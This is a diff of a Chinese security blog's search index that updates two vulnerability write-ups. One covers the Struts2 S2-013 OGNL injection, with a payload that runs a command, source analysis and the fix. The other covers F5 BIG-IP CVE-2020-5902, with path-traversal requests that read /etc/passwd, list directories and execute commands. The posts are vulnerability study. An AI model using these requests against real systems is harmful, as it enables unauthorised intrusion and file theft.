@@ -4,11 +4,11 @@
   
   
   <entry>
-    <title>struts2系列漏洞 S2-013</title>
-    <link href="/2020/07/23/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-013/"/>
-    <url>/2020/07/23/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-013/</url>
+    <title>F5 BIG-IP 学习</title>
+    <link href="/2020/07/23/F5-BIG-IP%E8%A7%82%E6%91%A9/"/>
+    <url>/2020/07/23/F5-BIG-IP%E8%A7%82%E6%91%A9/</url>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.14.1 版本的 struts2 + Tomcat 9。</p><p>修改 jsp 文件，加上一句：</p><pre><code class="html">&lt;s:url id=&quot;url&quot; action=&quot;login&quot; includeParams=&quot;all&quot; /&gt;</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>阅读<a href="https://cwiki.apache.org/confluence/display/WW/S2-013" target="_blank" rel="noopener">漏洞通告</a>，问题发生在 s:url/s:a 标签的 includeParams 属性，他们在根据这个属性处理 HTTP 参数的时候会进行表达式解析，payload 如下：</p><pre><code>data=%25{#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)}</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>看到 s:url 标签生成 URL 时会调用的 DefaultUrlHelper 类的 buildParametersString 方法：</p><pre><code class="java">Iterator iter = params.entrySet().iterator();while(iter.hasNext()) {    Entry&lt;String, Object&gt; entry = (Entry)iter.next();    String name = (String)entry.getKey();    Object value = entry.getValue();    if (value instanceof Iterable) {        ...    } else if (value instanceof Object[]) {        Object[] array = (Object[])((Object[])value);        for(int i = 0; i &lt; array.length; ++i) {            Object paramValue = array[i];            link.append(this.buildParameterSubstring(name, paramValue.toString()));            if (i &lt; array.length - 1) {                   link.append(paramSeparator);            }        }    } else {        ...    }    if (iter.hasNext()) {        link.append(paramSeparator);    }}</code></pre><p>遍历了传递的参数，然后调用了 buildParameterSubstring 方法：</p><pre><code class="java">private String buildParameterSubstring(String name, String value) {    StringBuilder builder = new StringBuilder();    builder.append(translateAndEncode(name));    builder.append(&#39;=&#39;);    builder.append(translateAndEncode(value));    return builder.toString();}public String translateAndEncode(String input) {    String translatedInput = translateVariable(input);    try {        return URLEncoder.encode(translatedInput, encoding);    } catch (UnsupportedEncodingException e) {        if (LOG.isWarnEnabled()) {            LOG.warn(&quot;Could not encode URL parameter &#39;#0&#39;, returning value un-encoded&quot;, input);        }        return translatedInput;    }}</code></pre><p>translateVariable 方法最后会来到之前看到过的 OgnlTextParser 方法的 evaluate 方法进行了解析。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 2.3.14.3 版本中，buildParameterSubstring 方法中去掉了表达式解析的部分，只剩下 URL 编码：</p><pre><code class="java">private String buildParameterSubstring(String name, String value) {    StringBuilder builder = new StringBuilder();    builder.append(encode(name));    builder.append(&#39;=&#39;);    builder.append(encode(value));    return builder.toString();}public String encode( String input ) {    try {        return URLEncoder.encode(input, encoding);    } catch (UnsupportedEncodingException e) {        if (LOG.isWarnEnabled()) {            LOG.warn(&quot;Could not encode URL parameter &#39;#0&#39;, returning value un-encoded&quot;, input);    }        return input;    }}</code></pre><hr><p>Orz</p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 最近老看到的名字很奇怪的软件，简单看一下，不深入。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>对这款软件有过了解的师傅可以自行搭建，像我这样之前完全没听过这个名字的菜鸡，参考的是<a href="https://xz.aliyun.com/t/8008" target="_blank" rel="noopener">这篇文章</a>，因为我自己注册账号下载的时候被拒绝了，所以直接使用的是文章给出的账号密码去下载的虚拟机，然后将 ova 文件拖入 Vmware 启动虚拟机，修改密码完成环境搭建。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用 1"></a>漏洞利用 1</h3><p>来自参考文章，其实就是越权访问了危险操作的接口，文件读取：</p><pre><code>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></pre><p>列目录：</p><pre><code>/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</code></pre><p>命令执行：</p><pre><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create cli alias private list command bash/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&amp;content=id/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list /tmp/cmd</code></pre><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析 1"></a>漏洞分析 1</h3><p>在阅读源码之前，先理一下软件结构，首先看看端口监听情况：</p><pre><code>[root@localhost:NO LICENSE:Standalone] modules # netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name...tcp6       0      0 :::443                  :::*                    LISTEN      4202/httpd...</code></pre><p>可以注意到，我们使用 HTTPS 协议访问它的 web 界面时，处理请求的其实是 Apache，所以这里其实是一个 Apache 代理 Tomcat 的结构，Apache 的配置文件可以在 /config/httpd 下面找到，其中有两个重要的配置文件，httpd.conf 和 proxy_ajp.conf，在 httpd.conf 文件里面有用户鉴权相关的配置，里面有这样一句注释：</p><pre><code>## This is the location of the external APIs used by clients.## The mod_auth_pam and mod_f5_auth_cookie packages have been modified# to recognize URLs under this path and perform standard Basic# authentication (rather than forward to the UI login page).#</code></pre><p>所以我们将这两个 Apache 扩展下载到本地，可以用 IDA 打开进行分析（但是 C++ 加上 Apache 函数，挺难看的），可以发现权限校验就是由 Apache 完成的，session 文件存放在 /var/run/pamcache/ 目录下，大致内容如下：</p><pre><code>2192.168.3.20admin0/bin/falseThu Jul 23 14:08:41 2020[All]AdministratoreOTD2tjVa3AqazzBP3VCBZHe171200</code></pre><p>包括用户名、IP、权限等等数据，权限校验完成后，Apache 就会将请求发送给 Tomcat，可以看 proxy_apj.conf：</p><pre><code>ProxyPassMatch ^/tmui/(.*\.jsp.*)$ ajp://localhost:8009/tmui/$1 retry=5ProxyPassMatch ^/tmui/Control/(.*)$ ajp://localhost:8009/tmui/Control/$1 retry=5ProxyPassMatch ^/tmui/deal/?(.*)$ ajp://localhost:8009/tmui/deal/$1 retry=5ProxyPassMatch ^/tmui/graph/(.*)$ ajp://localhost:8009/tmui/graph/$1 retry=5ProxyPassMatch ^/tmui/service/(.*)$ ajp://localhost:8009/tmui/service/$1 retry=5ProxyPassMatch ^/hsqldb(.*)$ ajp://localhost:8009/tmui/hsqldb$1 retry=5</code></pre><p>所以只要 Apache 认为请求符合权限，就可以越权访问 Tomcat 的接口，Java 项目源码可以在 /usr/local/www/tmui 目录下找到。</p><p>而 Apache/Nginx 和 Tomcat 因为解析不同出问题已经不少见了，18 年就见过一次。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用 2"></a>漏洞利用 2</h3><p>hqsldb 容易受到反序列化攻击：<a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902</a> 。</p><hr><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/8008" target="_blank" rel="noopener">https://xz.aliyun.com/t/8008</a></p><p><a href="https://www.anquanke.com/post/id/210706" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210706</a></p><p><a href="https://paper.seebug.org/1271" target="_blank" rel="noopener">https://paper.seebug.org/1271</a></p>]]></content>
     
     
     
@@ -23,11 +23,11 @@
   
   
   <entry>
-    <title>F5 BIG-IP观摩</title>
-    <link href="/2020/07/22/F5-BIG-IP%E8%A7%82%E6%91%A9/"/>
-    <url>/2020/07/22/F5-BIG-IP%E8%A7%82%E6%91%A9/</url>
+    <title>struts2系列漏洞 S2-013</title>
+    <link href="/2020/07/23/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-013/"/>
+    <url>/2020/07/23/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-013/</url>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 无，最近老看到的名字很奇怪的软件，稍加学习。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>对这款软件有过了解的师傅可以自行搭建，像我这样之前完全没听过这个名字的菜鸡，参考的是<a href="https://xz.aliyun.com/t/8008" target="_blank" rel="noopener">这篇文章</a>，因为我自己注册账号下载的时候被拒绝了，所以直接使用的是文章给出的账号密码去下载的虚拟机，然后将 ova 文件拖入 Vmware 启动虚拟机，修改密码完成环境搭建。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用 1"></a>漏洞利用 1</h3><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析 1"></a>漏洞分析 1</h3><p>源码可以在 /usr/local/www/tmui 目录下找到。</p><hr><p>参考文章：</p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.14.1 版本的 struts2 + Tomcat 9。</p><p>修改 jsp 文件，加上一句：</p><pre><code class="html">&lt;s:url id=&quot;url&quot; action=&quot;login&quot; includeParams=&quot;all&quot; /&gt;</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>阅读<a href="https://cwiki.apache.org/confluence/display/WW/S2-013" target="_blank" rel="noopener">漏洞通告</a>，问题发生在 s:url/s:a 标签的 includeParams 属性，他们在根据这个属性处理 HTTP 参数的时候会进行表达式解析，payload 如下：</p><pre><code>data=%25{#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)}</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>看到 s:url 标签生成 URL 时会调用的 DefaultUrlHelper 类的 buildParametersString 方法：</p><pre><code class="java">Iterator iter = params.entrySet().iterator();while(iter.hasNext()) {    Entry&lt;String, Object&gt; entry = (Entry)iter.next();    String name = (String)entry.getKey();    Object value = entry.getValue();    if (value instanceof Iterable) {        ...    } else if (value instanceof Object[]) {        Object[] array = (Object[])((Object[])value);        for(int i = 0; i &lt; array.length; ++i) {            Object paramValue = array[i];            link.append(this.buildParameterSubstring(name, paramValue.toString()));            if (i &lt; array.length - 1) {                   link.append(paramSeparator);            }        }    } else {        ...    }    if (iter.hasNext()) {        link.append(paramSeparator);    }}</code></pre><p>遍历了传递的参数，然后调用了 buildParameterSubstring 方法：</p><pre><code class="java">private String buildParameterSubstring(String name, String value) {    StringBuilder builder = new StringBuilder();    builder.append(translateAndEncode(name));    builder.append(&#39;=&#39;);    builder.append(translateAndEncode(value));    return builder.toString();}public String translateAndEncode(String input) {    String translatedInput = translateVariable(input);    try {        return URLEncoder.encode(translatedInput, encoding);    } catch (UnsupportedEncodingException e) {        if (LOG.isWarnEnabled()) {            LOG.warn(&quot;Could not encode URL parameter &#39;#0&#39;, returning value un-encoded&quot;, input);        }        return translatedInput;    }}</code></pre><p>translateVariable 方法最后会来到之前看到过的 OgnlTextParser 方法的 evaluate 方法进行了解析。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 2.3.14.3 版本中，buildParameterSubstring 方法中去掉了表达式解析的部分，只剩下 URL 编码：</p><pre><code class="java">private String buildParameterSubstring(String name, String value) {    StringBuilder builder = new StringBuilder();    builder.append(encode(name));    builder.append(&#39;=&#39;);    builder.append(encode(value));    return builder.toString();}public String encode( String input ) {    try {        return URLEncoder.encode(input, encoding);    } catch (UnsupportedEncodingException e) {        if (LOG.isWarnEnabled()) {            LOG.warn(&quot;Could not encode URL parameter &#39;#0&#39;, returning value un-encoded&quot;, input);    }        return input;    }}</code></pre><hr><p>Orz</p>]]></content>
     
     
     
@@ -457,9 +457,9 @@
       
       <tag>Web</tag>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
     </tags>
     
@@ -1334,9 +1334,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
     </tags>
     
@@ -1376,9 +1376,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
     </tags>
     
